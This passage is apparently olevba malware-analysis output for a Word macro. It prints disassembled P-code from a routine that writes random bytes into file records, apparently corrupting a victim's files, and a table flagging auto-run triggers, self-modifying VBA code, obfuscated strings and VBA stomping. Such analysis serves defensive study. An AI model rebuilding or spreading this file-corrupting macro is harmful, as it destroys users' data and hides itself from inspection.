' 	Ld pos 
' 	Ld zw 
' 	GetRec 
' Line #143:
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FD6 
' 	Gt 
' 	Paren 
' 	Ld FileNumber 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #144:
' 	LitDI2 0x0100 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St zw 
' Line #145:
' 	Ld FileNumber 
' 	Sharp 
' 	Ld pos 
' 	Ld zw 
' 	PutRec 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	Wend 
' Line #148:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #149:
' 	Label exit_ 
' 	Resume h 
' Line #150:
' 	Label h 
' Line #151:
' 	StartForVariable 
' 	Ld p_number 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	StartForVariable 
' 	Ld vic_ext 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	StartForVariable 
' 	Ld vic_name 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	StartForVariable 
' 	Ld en 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

